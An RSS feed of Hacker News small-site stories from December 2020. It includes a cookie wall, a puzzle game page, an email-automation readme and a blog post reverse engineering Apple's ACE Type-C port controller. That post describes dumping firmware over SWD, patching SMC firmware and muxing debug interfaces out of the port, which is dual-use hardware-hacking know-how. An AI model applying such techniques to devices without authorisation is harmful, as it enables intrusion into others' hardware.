<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 2]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 2. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Fri, 01 Jan 2021 04:52:41 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-2.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Fri, 01 Jan 2021 04:52:40 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[An Assange confidant in the sights of the CIA]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25580295">thread link</a>) | @tosh
<br/>
December 30, 2020 | https://www.golem.de/news/andy-mueller-maguhn-ein-assange-vertrauter-im-visier-der-cia-2012-153049.html | <a href="https://web.archive.org/web/*/https://www.golem.de/news/andy-mueller-maguhn-ein-assange-vertrauter-im-visier-der-cia-2012-153049.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="screen">

<div>
<div>
    
    <section>
        <h2>Mit Werbung weiterlesen</h2>
        <p>Besuchen Sie Golem.de wie gewohnt mit Werbung und Tracking, indem Sie der Nutzung aller Cookies zustimmen.
            Details zum Tracking finden Sie
            <!-- in der <a target="_blank" href="https://www.golem.de/sonstiges/Datenschutz.html">Datenschutz&shy;erkl&auml;rung</a> und -->
            im <span id="gsptextpc1">Privacy Center</span>.
        </p>
        <p id="loadhint">
                Skript wurde nicht geladen. Informationen zur Problembehandlung finden Sie
                <a href="https://www.golem.de/sonstiges/techinfo.html" target="_blank">hier</a>.
        </p>
        <div>
            
            <p id="gspcookiehint">Um der Nutzung von Golem.de mit Werbung zustimmen zu können,
                müssen Cookies in Ihrem Browser aktiviert sein. Weitere Informationen finden Sie
                <a href="https://www.golem.de/sonstiges/techinfo.html" target="_blank">hier</a>.
            </p>
            <p id="gspiframehint">Die Zustimmung in einem iFrame ist nicht möglich.<br>
                <a href="#" onclick="GolemConsent.redirectBack(true);">Seite in eigenem Fenster öffnen</a>.
            </p>
            <p id="fallbackhint">Der Zustimmungs-Dialog konnte nicht korrekt geladen werden,
                eine Zustimmung gilt nur vorläufig. Informationen zur Problem­behandlung finden Sie
                <a href="https://www.golem.de/sonstiges/techinfo.html" target="_blank">hier</a>.
            </p>
        </div>
        <p>
            Die Möglichkeit zum Widerruf finden Sie
            in unserer <a target="_blank" href="https://www.golem.de/sonstiges/Datenschutz.html#Widerruf">Datenschutz­erklärung</a>
            oder über den Link <span id="gsptextpc2">Cookies &amp; Tracking</span> am Ende jeder Seite.
        </p>
    </section>
    
    <section>
        <h2>… oder Golem pur bestellen</h2>
        <p>Mit Golem pur ab 3 Euro pro Monat können Sie Golem.de ohne Analyse- und
            Werbe­cookies nutzen, es kommen nur für unser Angebot erforderliche Cookies zum Einsatz.
        </p>
        <a target="_blank" href="https://redirect.golem.de/nl.php?id=account_cta_cmp">Zu Golem pur</a>
        <p id="loginhint">
        Bereits Pur-Leser?
        <a href="https://account.golem.de/user/login?redirect=https://www.golem.de/news/andy-mueller-maguhn-ein-assange-vertrauter-im-visier-der-cia-2012-153049.html">Hier anmelden</a>.            <span id="nosubhint">Kein aktives Abo vorhanden.</span>
        </p>
    </section>
    <div>
        
        <div>
            <details>
                <summary>Informationen auf einem Gerät speichern und/oder abrufen</summary>
                <p>Für die Ihnen angezeigten Verarbeitungszwecke können Cookies, Geräte-Kennungen
                    oder andere Informationen auf Ihrem Gerät gespeichert oder abgerufen werden.
                </p>
            </details>
            <details>
                <summary>Personalisierte Anzeigen und Inhalte, Anzeigen- und Inhaltsmessungen, Erkenntnisse über Zielgruppen und Produktentwicklungen</summary>
                <p>Anzeigen und Inhalte können basierend auf einem Profil personalisiert werden.
                    Es können mehr Daten hinzugefügt werden, um Anzeigen und Inhalte besser zu personalisieren.
                    Die Performance von Anzeigen und Inhalten kann gemessen werden.
                    Erkenntnisse über Zielgruppen, die die Anzeigen und Inhalte betrachtet haben, können abgeleitet werden.
                    Daten können verwendet werden, um Benutzerfreundlichkeit, Systeme und Software aufzubauen oder zu verbessern.
                </p>
            </details>
            <details>
                <summary>Genaue Standortdaten verwenden</summary>
                <p>Es können genaue Standortdaten verarbeitet werden,
                    um sie für einen oder mehrere Verarbeitungszwecke zu nutzen.
                </p>
            </details>
        </div>
    </div>
    
</div><!-- c2_content -->
</div><!-- c2_wrapper -->

</div></div>]]>
            </description>
            <link>https://www.golem.de/news/andy-mueller-maguhn-ein-assange-vertrauter-im-visier-der-cia-2012-153049.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25580295</guid>
            <pubDate>Wed, 30 Dec 2020 10:01:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cube Composer]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25579504">thread link</a>) | @smusamashah
<br/>
December 29, 2020 | https://david-peter.de/cube-composer/ | <a href="https://web.archive.org/web/*/https://david-peter.de/cube-composer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="container">
            <p><img src="https://david-peter.de/cube-composer/img/cube-composer.svg" width="200" height="35" alt="cube composer"></p>
            <div id="panel">
                <p><b>Choose level:</b><br>
                
                <b>Goal:</b></p>
                
            </div>
            <div id="message">
                <p><span id="solved">Solved ✓</span></p><div><a id="nextlevel"><u>N</u>ext level</a></div>
            </div>
            <canvas id="canvas" width="1600" height="860"></canvas>
            <div id="controls">
                <div>
                    <ul id="available"></ul>
                </div>
                <div>
                    <ul id="program"></ul>
                    <div>
                        <a id="reset"><u>R</u>eset</a>
                    </div>
                </div>
            </div>
            <p>
                A game by <a href="https://david-peter.de/">David Peter</a>. Source code on <a href="https://github.com/sharkdp/cube-composer">GitHub</a>.<br>
                
            </p>
        </div></div>]]>
            </description>
            <link>https://david-peter.de/cube-composer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25579504</guid>
            <pubDate>Wed, 30 Dec 2020 07:43:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ACE: Apple Type-C Port Controller Secrets]]>
            </title>
            <description>
<![CDATA[
Score 105 | Comments 11 (<a href="https://news.ycombinator.com/item?id=25579286">thread link</a>) | @aunali1
<br/>
December 29, 2020 | https://blog.t8012.dev/ace-part-1/ | <a href="https://web.archive.org/web/*/https://blog.t8012.dev/ace-part-1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
<div>
<article>

<figure>
<img srcset="https://blog.t8012.dev/content/images/size/w300/2020/12/s-l400.jpg 300w,
                            https://blog.t8012.dev/content/images/size/w600/2020/12/s-l400.jpg 600w,
                            https://blog.t8012.dev/content/images/size/w1000/2020/12/s-l400.jpg 1000w,
                            https://blog.t8012.dev/content/images/size/w2000/2020/12/s-l400.jpg 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://blog.t8012.dev/content/images/size/w2000/2020/12/s-l400.jpg" alt="ACE: Apple Type-C Port Controller Secrets | Part 1">
</figure>
<section>
<div>
<h2 id="introduction">Introduction</h2><p>After our team successfully <a href="https://www.theiphonewiki.com/wiki/T8012#Bootrom_Exploits">ported</a> the <a href="https://www.theiphonewiki.com/wiki/Checkm8_Exploit">checkm8</a> exploit to the AppleSilicon T2 chip, we began exploring methods for closed-case hardware debugging, or CCD, as found on other iDevices. On such devices, the <a href="https://developer.arm.com/architectures/cpu-architecture/debug-visibility-and-trace/coresight-architecture/serial-wire-debug">Serial Wire Debug</a> protocol can be muxed out across the Lightning connector, which we presumed was replicable across the USB Type-C connector. With some assistance from easily obtainable schematics for our MacBook models, we have determined that muxing is handled by an Apple/TI co-designed <a href="https://www.usb.org/document-library/usb-type-cr-port-controller-interface-specification">USB Type-C Port Controller</a>, colloquially known as "ACE". The following details our findings and the vendor defined protocol, termed AppleVDM, Apple has implemented over the USB Power Delivery standard for muxing out various internal peripherals.</p><p>A member of our team, @h0m3us3r has dumped the ACE firmware by attaching a SWD probe onto exposed test points on the logic board of a MacBook Pro. Thanks to this we were able to obtain both the ROM and the firmware payload patch applied over it and discover that the ACE chip contains a <code><a href="https://developer.arm.com/ip-products/processors/cortex-m/cortex-m0">Cortex-M0 r0p1</a></code> ARM core. Most of the static analysis was later conducted by @mrarm.</p><pre><code>Connecting to target via SWD
Found SW-DP with ID 0x0BC11477
DPIDR: 0x0BC11477
Scanning AP map to find all available APs
AP[1]: Stopped AP scan as end of AP map has been reached
AP[0]: AHB-AP (IDR: 0x04770031)
Iterating through AP map to find AHB-AP to use
AP[0]: Core found
AP[0]: AHB-AP ROM base: 0xE00FF000
CPUID register: 0x410CC601. Implementer code: 0x41 (ARM)
Found Cortex-M0 r0p1, Little endian.
FPUnit: 4 code (BP) slots and 0 literal slots
CoreSight components:
ROMTbl[0] @ E00FF000
ROMTbl[0][0]: E000E000, CID: B105E00D, PID: 000BB008 SCS
ROMTbl[0][1]: E0001000, CID: B105E00D, PID: 000BB00A DWT
ROMTbl[0][2]: E0002000, CID: B105E00D, PID: 000BB00B FPB
Cortex-M0 identified.
</code></pre>
<center>Segger J-Link Probe output when attached to ACE2 (CD3217).</center><h2 id="ace-overview">ACE Overview</h2><p>To better understand the inner-workings of ACE, we began looking for identifying information within the dumped firmware. We found the string <code>CD3217 &nbsp; HW0022 FW002.032.00 ZACE2-J213</code> and upon searching <code>CD3217</code> online resulted in the similar <a href="https://www.ti.com/lit/ds/symlink/tps65986.pdf">TI TPS65986</a>. Based on how similar the functional description of the aforementioned TI USB Type-C Controller is to ACE, and considering that TI co-designed ACE with Apple, it was reasonable to assume most of the technical information applies to ACE.</p><p>TI's USB Type-C Controllers expose an I²C interface for host management, for which we found the excellent <a href="https://www.ti.com/lit/ug/slvuan1a/slvuan1a.pdf">Host Interface Technical Reference Manual</a>, documenting a multitude of public I²C registers and commands.</p><figure><img src="https://blog.t8012.dev/content/images/2020/12/image.png" alt="" srcset="https://blog.t8012.dev/content/images/size/w600/2020/12/image.png 600w, https://blog.t8012.dev/content/images/size/w1000/2020/12/image.png 1000w, https://blog.t8012.dev/content/images/2020/12/image.png 1330w" sizes="(min-width: 720px) 720px"><figcaption>TPS65986 Functional Block Diagram</figcaption></figure><p>The primary component of focus based on the above block diagram is the digital core, which communicates directly with the host and runs the firmware we dumped previously. As mentioned, the core is based on a <code>Cortex-M0 r0p1</code>. Unfortunately, we were unable to create a complete memory map with peripherals as TI does not release public information on the core itself. Regardless, we have the basic memory layout as follows:</p><p>Since we weren't sure whether the code for muxing out things lives in the ACE or somewhere else (there are registers for receiving vendor messages and processing them on another chip), we also investigated the firmware of chips that can directly communicate with the ACE, the SMC, part of T2 SoC, and the Thunderbolt controller. While we obtained and analyzed the I2C usages in the SMC firmware and found no suspicious code whatsoever, we had issues with analyzing the Thunderbolt controller firmware and decided to only reverse engineer it as a last resort. We initially thought that the only way that we could talk with the ACE from Mac OS (Intel) was by modifying the SMC firmware to relay commands to the ACE. While we have successfully managed to edit the SMC firmware and talk with the ACE, it turned out that this effort wasn't needed. Later we stumbled upon the following project: <a href="https://github.com/osy/ThunderboltPatcher">https://github.com/osy/ThunderboltPatcher</a>, which uses the AppleHPM kext in order to communicate with the ACE.</p><p>The AppleHPM KEXT allows a user space program running as root to read and write ACE registers. It also has several interesting methods that seem to be intended for reading and writing registers on ACEs connected using a USB Type-C cable to the DUT. Unfortunately, while we tried invoking them, we didn't manage to get these methods working, suggesting that either they have been disabled on production hardware or need some more preparation work in order to work. We also discovered that there exists an EFI mode firmware updater for the ACE called <code>HPMUtil.efi</code>, which we also partially reverse engineered. There seems to be several methods of updating the ACEs depending on the hardware revision; the EFI program also seems to have an argument that makes it update externally connected ACEs, however at least for recent ACEs it seems to be broken; the only update route that would work on the firmware dump we obtained from our Mac (based on available commands) seems to be hardcoded in a few places to run commands on the local ACE.</p><p>There are at least 3 known revisions of the ACE chip. Based on hardware available to us, the first variant, ACE1, is known to be used in 2018 and older T2 models, the second, ACE2, in 2019 and newer T2 models, and the third in 2020 M1 enabled laptops. The software update method differs significantly between ACE1 and ACE2. At the time of writing the article, we have only successfully dumped a single ACE firmware (ACE2) and all the analysis here is based on that version.</p><h2 id="usb-pd">USB PD</h2><p>The logical channel for telling the Mac to mux out something other than USB from the chip would be USB PD, since ACE's main communication vector with external devices is USB PD and because controlling data lines using USB PD is a widespread practice (see: MIPI debug interface as well as this article on getting UART off an Samsung phone: <a href="https://ntnuopen.ntnu.no/ntnu-xmlui/bitstream/handle/11250/2632162/bookchapter.pdf">https://ntnuopen.ntnu.no/ntnu-xmlui/bitstream/handle/11250/2632162/bookchapter.pdf</a>). This TI-derived controller can be configured to support some variant of MIPI debug mode by default (and the MIPI debug ID is present in the Apple ACE firmware as well), however as we discovered later it is disabled in Apple's configuration and can not be used. As such, we decided to look for other Vendor Defined Messages that the ACE understands.</p><p>In the USB PD protocol, entering a vendor mode begins by sending a SVID (Standard ID or Vendor ID, usually the vendor's USB VID) and object position (think of it as a sub mode that the vendor can define). By analyzing the ACE firmware we found at least 3 possible object positions under the Apple SVID, however their availability is dynamic and by default only a single SVID and object position is available. This primary mode is, for example, used when the Apple's charger is connected. We are not sure when the other modes are activated and plan to do further work related to figuring out what the purpose of these other modes is.</p><p>Since it would be logical if there was a reply for the command for entering a mode and also because reverse engineering an embedded firmware with no context whatsoever is hard, we decided to look into the <code>VDMs</code> command, which can be used to send a VDM PD message. This allowed us to gather important information about the firmware's inner workings and also to find a few functions that sent a message with Apple's vendor ID. We investigated several of these, some of them were indeed related to the protocol used with the charger (which we aren't sure what the purpose of is; however from what it seems it can be only used to read some memory sections from the external device), but we also found another procedure that had three cases, two of which replied with 16-bit values (created from information from a particular memory area) in a similar way to the Discover SVIDs VDM, and one of them was complex and handled additional logic. We investigated it further and eventually managed to use it to mux things out of the controller.</p><p>Another possible use of the <code>VDMs</code> command can be found in the AppleHPM KEXT and the <code>HPLUtil.efi</code> program, which is reading registers from externally connected devices. Since we haven't given much attention to it as it was not our goal and our experiments were a failure, we are not going to describe it in this article.</p><p>Note that since SWD can also be muxed from the ACE, further reverse engineering ACE modes is not that interesting; you should be able to use the ACE's SWD to trigger any mux choice of your choosing and directly talk to all peripherals ACE has access to.</p><h2 id="dive-into-the-code">Dive into the code</h2><p>With @h0m3us3r's dump of ROM and RAM memory, we started by loading the ACE firmware in IDA. The reset handler address is present at <code>0x00000004</code> and can be used to get the address of the entrypoint.</p><p>The command table can be trivially found by looking for the 4 character codes. Register table requires a bit more effort but is also not hard to find (since there is a register that is a string, you can find what references it). In comparison to the public TI documentation, there are substantially more commands and registers available, some of which are Apple-specific additions. Since the firmware has barely any strings or debug information, the command list has been very helpful.</p><p>After initially exploring the firmware we quickly stumbled upon cursed looking trampolines such as the following:</p><pre><code>ROM:000266C2 _Command_HRST                           ; DATA XREF: ROM:commandsâ†“o
ROM:000266C2
ROM:000266C2
ROM:000266C2                 PUSH            {R4-R6,LR}
ROM:000266C4                 MOV             R4, R1
ROM:000266C6                 MOV             R5, R0
ROM:000266C8                 BL              sub_E4
ROM:000266CC                 LDR             R0, =dword_20041040
ROM:000266CE                 MOV             R1, R4
ROM:000266D0                 ADDS            R0, #0x40 ; '@'
ROM:000266D2                 LDR             R2, [R0]
ROM:000266D4                 MOV             R0, R5
ROM:000266D6                …</code></pre></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.t8012.dev/ace-part-1/">https://blog.t8012.dev/ace-part-1/</a></em></p>]]>
            </description>
            <link>https://blog.t8012.dev/ace-part-1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25579286</guid>
            <pubDate>Wed, 30 Dec 2020 06:49:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Candymail – Email Automation for Node.js]]>
            </title>
            <description>
<![CDATA[
Score 37 | Comments 12 (<a href="https://news.ycombinator.com/item?id=25578834">thread link</a>) | @sssaini
<br/>
December 29, 2020 | https://saasbase.dev/candymail | <a href="https://web.archive.org/web/*/https://saasbase.dev/candymail">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><article id="block-candymail"><p><span><span>CandyMail makes it easy to trigger and send multi-step email sequences in Node.js using a single JSON file. Built for bootstrappers, indie makers with special care.</span></span></p><div id="block-a7a22de82c9f4f61a9581a647e597231"><div><p><img alt="image" src="https://saasbase.dev/_next/image?url=https%3A%2F%2Fapi.super.so%2Fasset%2Fsaasbase.dev%2F638675a6-a551-47cc-b24f-892b2cff969e.png&amp;w=1080&amp;q=100" srcset="https://saasbase.dev/_next/image?url=https%3A%2F%2Fapi.super.so%2Fasset%2Fsaasbase.dev%2F638675a6-a551-47cc-b24f-892b2cff969e.png&amp;w=640&amp;q=100 1x, https://saasbase.dev/_next/image?url=https%3A%2F%2Fapi.super.so%2Fasset%2Fsaasbase.dev%2F638675a6-a551-47cc-b24f-892b2cff969e.png&amp;w=1080&amp;q=100 2x" decoding="async"></p></div></div><h2 id="block-f23dcaeb10b744778d2080a9d073d409"><span id="f23dcaeb10b744778d2080a9d073d409"></span><span><span><strong>Features</strong></span></span></h2><ol><li id="block-45aa8049a4cf4dfa90441e2d4a931dc9"><span><span><strong>Portable</strong></span><span>: Create, share and reuse email marketing strategies between different products</span></span></li><li id="block-04009c38a7d743eb85e3206079018bf7"><span><span><strong>Simple to use</strong></span><span>: Time to send, subject, body of the emails can all be set up in a single JSON file</span></span></li><li id="block-a64766efe6574cc9b4c72db02135e034"><span><span><strong>Free</strong></span><span>: No need to pay for monthly Mailchimp etc. payments for email automation plans</span></span></li></ol><h2 id="block-5ab828b20084466c9a9655231ea704e7"><span id="5ab828b20084466c9a9655231ea704e7"></span><span><span><strong>Use Cases</strong></span></span></h2><ul><li id="block-c44e7c12446340988c153bfdfe2d4487"><span><span>Build better onboarding by guiding the user through the app with paced training emails</span></span></li><li id="block-04216dfc690441ccbc29f2c49eb56297"><span><span>Reduce churn by sending exciting community content every few days</span></span></li><li id="block-20f9940a1ef542958ad8c5faa7b5be4c"><span><span>Convert more customers to paid plans by offering discounts based on the user's usage activity</span></span></li></ul><h2 id="block-ebb2664d7aff451b83ee65168e44bbc8"><span id="ebb2664d7aff451b83ee65168e44bbc8"></span><span><span><strong>Installation</strong></span></span></h2><p><span><span>Install candymail using yarn:</span></span></p><p><span><span>Or npm:</span></span></p><div id="block-3b1e9c2a5b5442d99676426c2499d03f"><pre><code><span>npm install --save candymail</span></code></pre><figcaption><span></span></figcaption></div><h2 id="block-dafd20b6db8f4fa495bcc253547865b6"><span id="dafd20b6db8f4fa495bcc253547865b6"></span><span><span><strong>Getting Started</strong></span></span></h2><h3 id="block-427f998161b748f498f9b6cbc5ced03a"><span id="427f998161b748f498f9b6cbc5ced03a"></span><span><span><strong>Configuration</strong></span></span></h3><p><span><span>Create a&nbsp;</span><span><code>candymail.automation.json</code></span><span>&nbsp;file on the root level of your project.</span></span></p><p><span><span>Here's a sample:</span></span></p><div id="block-e0c98a5f7c5241d4bbe3eb12f1e5696c"><pre><code><span>{</span><span>
</span><span>  </span><span>"automations"</span><span>:</span><span> </span><span>[</span><span>
</span><span>    </span><span>{</span><span>
</span><span>      </span><span>"name"</span><span>:</span><span> </span><span>"automation1"</span><span>,</span><span>
</span><span>      </span><span>"description"</span><span>:</span><span> </span><span>"tell users about pro features"</span><span>,</span><span>
</span><span>      </span><span>"trigger_name"</span><span>:</span><span> </span><span>"proplan"</span><span>,</span><span>
</span><span>      </span><span>"emails"</span><span>:</span><span> </span><span>[</span><span>
</span><span>        </span><span>{</span><span>
</span><span>          </span><span>"trigger"</span><span>:</span><span> </span><span>"time"</span><span>,</span><span>
</span><span>          </span><span>"sendDelay"</span><span>:</span><span> </span><span>1</span><span>,</span><span>
</span><span>          </span><span>"subject"</span><span>:</span><span> </span><span>"Have you tried Feature A?"</span><span>,</span><span>
</span><span>          </span><span>"body"</span><span>:</span><span> </span><span>"Feature A will let you do ABC things. Check it out!"</span><span>,</span><span>
</span><span>          </span><span>"from"</span><span>:</span><span> </span><span>"abc@gmail.com"</span><span>
</span><span>        </span><span>}</span><span>,</span><span>
</span><span>        </span><span>{</span><span>
</span><span>          </span><span>"trigger"</span><span>:</span><span> </span><span>"time"</span><span>,</span><span>
</span><span>          </span><span>"sendDelay"</span><span>:</span><span> </span><span>3</span><span>,</span><span>
</span><span>          </span><span>"subject"</span><span>:</span><span> </span><span>"Try our feature B!"</span><span>,</span><span>
</span><span>          </span><span>"body"</span><span>:</span><span> </span><span>"We released feature B just last week and can't wait for you to try it out :)"</span><span>,</span><span>
</span><span>          </span><span>"from"</span><span>:</span><span> </span><span>"abc@gmail.com"</span><span>
</span><span>        </span><span>}</span><span>
</span><span>      </span><span>]</span><span>
</span><span>    </span><span>}</span><span>
</span><span>  </span><span>]</span><span>
</span><span></span><span>}</span><span>
</span>
</code></pre><figcaption><span></span></figcaption></div><h3 id="block-4016925d0984430085d1ad2a72663cce"><span id="4016925d0984430085d1ad2a72663cce"></span><span><span><strong>Supported Email Providers</strong></span></span></h3><ul><li id="block-d88924222cb4409b9a8d37f5c3a28ed0"><span><span>Gmail</span></span></li><li id="block-1df81b4e29f54e25944ccc0e93ef641d"><span><span>Looking for more support? Send me a message.</span></span></li></ul><h3 id="block-82f3fafe4e084cb7af5c77bca9444d1d"><span id="82f3fafe4e084cb7af5c77bca9444d1d"></span><span><span><strong>Usage</strong></span></span></h3><div id="block-8d7360b2d2d045448baf1ed1063f3e13"><pre><code><span>const</span><span> path </span><span>=</span><span> </span><span>require</span><span>(</span><span>'path'</span><span>)</span><span>
</span><span></span><span>const</span><span> candymail </span><span>=</span><span> </span><span>require</span><span>(</span><span>'candymail'</span><span>)</span><span>
</span>
<span></span><span>const</span><span> automationPath </span><span>=</span><span> path</span><span>.</span><span>resolve</span><span>(</span><span>'candymail.automation.json'</span><span>)</span><span>
</span>
<span>candymail</span><span>.</span><span>init</span><span>(</span><span>automationPath</span><span>,</span><span> </span><span>{</span><span>
</span><span>  senderEmail</span><span>:</span><span> </span><span>**</span><span>GMAILEMAIL</span><span>**</span><span>,</span><span>
</span><span>  senderPassword</span><span>:</span><span> </span><span>**</span><span>GMAILPASSWORD</span><span>**</span><span>
</span><span></span><span>}</span><span>)</span><span>
</span>
<span>candymail</span><span>.</span><span>start</span><span>(</span><span>)</span><span>
</span>
<span></span><span>const</span><span> user </span><span>=</span><span> </span><span>'howivey729@chatdays.com'</span><span>
</span><span>candymail</span><span>.</span><span>runAutomation</span><span>(</span><span>'automation1'</span><span>,</span><span> user</span><span>)</span><span>
</span>
<span></span><span>console</span><span>.</span><span>log</span><span>(</span><span>'Emails added to queue'</span><span>,</span><span> candymail</span><span>.</span><span>getAllScheduledMessages</span><span>(</span><span>)</span><span>)</span><span>
</span>
</code></pre><figcaption><span></span></figcaption></div><p><span><span>Note: Having problems with Gmail? Enable&nbsp;</span><span><code>Allow less secure apps</code></span><span>&nbsp;in Google Account settings&nbsp;</span><span><a href="https://myaccount.google.com/lesssecureapps" target="_blank" rel="noopener noreferrer">here</a></span><span>.</span></span></p><h2 id="block-8905c8f6ec90428290f752898c389144"><span id="8905c8f6ec90428290f752898c389144"></span><span><span><strong>Automation File Options</strong></span></span></h2><div id="block-92d9833cf5bd44c895eee0027a1111fc"><div><table><thead><tr><th>Property</th><th>Required</th><th>Description</th></tr></thead><tbody><tr><td><p><span><span>trigger</span></span></p></td><td></td><td><p><span><span>Name of the trigger (Not usable)</span></span></p></td></tr><tr><td><p><span><span>sendDelay</span></span></p></td><td><div></div></td><td><p><span><span>Delay after which the email will be sent (in hours). From time 0, not from the last email</span></span></p></td></tr><tr><td><p><span><span>subject</span></span></p></td><td><div></div></td><td><p><span><span>Subject of the email</span></span></p></td></tr><tr><td><p><span><span>body</span></span></p></td><td><div></div></td><td><p><span><span>Body of the email</span></span></p></td></tr><tr><td><p><span><span>from</span></span></p></td><td><div></div></td><td><p><span><span>Sender's Email Address</span></span></p></td></tr></tbody></table></div></div><h2 id="block-9aac3da583924daf892d731f0ae707ed"><span id="9aac3da583924daf892d731f0ae707ed"></span><span><span><strong>Methods</strong></span></span></h2><h3 id="block-aa32ddc39a3949d99452397186c7f687"><span id="aa32ddc39a3949d99452397186c7f687"></span><span><span><strong>init (automationPath, config)</strong></span></span></h3><p><span><span>Initializes automations specified in the automation path and sets the configuration with sender's email and password.</span></span></p><ul><li id="block-1394bdb55dd148f9a9f5e08a65240a86"><span><span><strong>automationPath</strong></span><span>: Absolute path to the candymail.automation.json file. Example:&nbsp;</span><span><code>path.resolve('example', 'candymail.automation.json')</code></span><span>&nbsp;if the file is located at&nbsp;</span><span><code>ROOT*/example/candymail.automation.json</code></span><span>.</span></span></li><li id="block-35edceb8c19b427fa7f45d1de635de7a"><span><span><strong>config</strong></span><span>:&nbsp;</span><span><code>{ senderEmail -&gt; Gmail Address of the sender, senderPassword -&gt; Gmail Password of the sender }</code></span></span></li></ul><h3 id="block-86ce155fe82047cbaed3aab4820b7c4b"><span id="86ce155fe82047cbaed3aab4820b7c4b"></span><span><span><strong>start()</strong></span></span></h3><p><span><span>Starts the internal timer that will send emails at appropriate times.</span></span></p><h3 id="block-ca0e460e1f5a4dc28c00e2234cbcbfce"><span id="ca0e460e1f5a4dc28c00e2234cbcbfce"></span><span><span><strong>runAutomation(automationName)</strong></span></span></h3><p><span><span>Triggers an automation based on&nbsp;</span><span><code>name</code></span><span>&nbsp;specified in the&nbsp;</span><span><code>candymail.automation.json</code></span><span>&nbsp;file. Needs&nbsp;</span><span><code>candymail.start()</code></span><span>&nbsp;to have been called.</span></span></p><ul><li id="block-9d31ffa059614958b3e26dab0fa275ae"><span><span><strong>automationName</strong></span><span>: Name of&nbsp;</span><span><code>automation</code></span><span>&nbsp;in&nbsp;</span><span><code>candymail.automation.json</code></span><span>. Example: 'automation1'.</span></span></li></ul><h3 id="block-08de5de186f546e6b619a4028cd9b4d1"><span id="08de5de186f546e6b619a4028cd9b4d1"></span><span><span><strong>getAllScheduledMessages()</strong></span></span></h3><p><span><span>Get the list of all scheduled messages.</span></span></p><h3 id="block-7bfc9eff28bc4cbe8a2ae79733484e90"><span id="7bfc9eff28bc4cbe8a2ae79733484e90"></span><span><span><strong>getScheduledMessagesAtTime(time)</strong></span></span></h3><p><span><span>Get the list of scheduled messages for a particular&nbsp;</span><span><code>time</code></span><span>.</span></span></p><ul><li id="block-4544cfeaf80c42e491a6400962124475"><span><span><strong>time</strong></span><span>: Time should be specified in this format:&nbsp;</span><span><code>MM/DD/YYYY:HH</code></span><span>. For Example:&nbsp;</span><span><code>8/20/2020:2</code></span><span>.</span></span></li></ul><h3 id="block-a3786a62f496404c9660f76ba08033ed"><span id="a3786a62f496404c9660f76ba08033ed"></span><span><span><strong>clearAllScheduledMessages()</strong></span></span></h3><p><span><span>Clears all scheduled messages.</span></span></p><h3 id="block-7de077481f3147fea4dba9619476641f"><span id="7de077481f3147fea4dba9619476641f"></span><span><span><strong>stop()</strong></span></span></h3><p><span><span>Stops the internal timer. Can be restarted with&nbsp;</span><span><code>candymail.start()</code></span></span></p><h3 id="block-5d10311284a546dc80c3e57eb45c3392"><span id="5d10311284a546dc80c3e57eb45c3392"></span><span><span><strong>destroy()</strong></span></span></h3><p><span><span>Destroys the internal timer.</span></span></p><h2 id="block-1a98b5e65f4a41e28e4965b5d3d7de9b"><span id="1a98b5e65f4a41e28e4965b5d3d7de9b"></span><span><span><strong>Notes</strong></span></span></h2><ol><li id="block-6bdaea5d6e764e5da158efec480f2add"><span><span>Only the hour value will be used in the cron, minutes will be ignored. +1 hour at 11:58 is 12.</span></span></li><li id="block-d3354e8bdee045c69e7bb24dbd1bebec"><span><span>Object keys:&nbsp;</span><span><code>MM/DD/YYYY:HH</code></span><span>. Hours are specified in 24-hour format.</span></span></li><li id="block-ce94d7c86c894d17ab928f86fa776aef"><span><span>There is currently no&nbsp;</span><span><code>Unsubscribe</code></span><span>&nbsp;option in the emails. Being worked on right now.</span></span></li><li id="block-129c9e22b7c84f48bbcc4d3f284ea196"><span><span>Only supports GMail. More providers being added right now.</span></span></li></ol><div id="block-a05319bc3972418aa5f409ef65943cd3"><p><span><span>Got Feeback? Hit me up at&nbsp;</span><span><a href="mailto:sunnyashiin@gmail.com" target="_blank" rel="noopener noreferrer">sunnyashiin@gmail.com</a></span><span>&nbsp;Now available for freelance work.</span></span></p></div></article></div></div></div>]]>
            </description>
            <link>https://saasbase.dev/candymail</link>
            <guid isPermaLink="false">hacker-news-small-sites-25578834</guid>
            <pubDate>Wed, 30 Dec 2020 05:18:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Immigrate to Canada]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25577873">thread link</a>) | @partingshots
<br/>
December 29, 2020 | https://www.canada.ca/en/immigration-refugees-citizenship/services/immigrate-canada.html | <a href="https://web.archive.org/web/*/https://www.canada.ca/en/immigration-refugees-citizenship/services/immigrate-canada.html">archive.org</a>
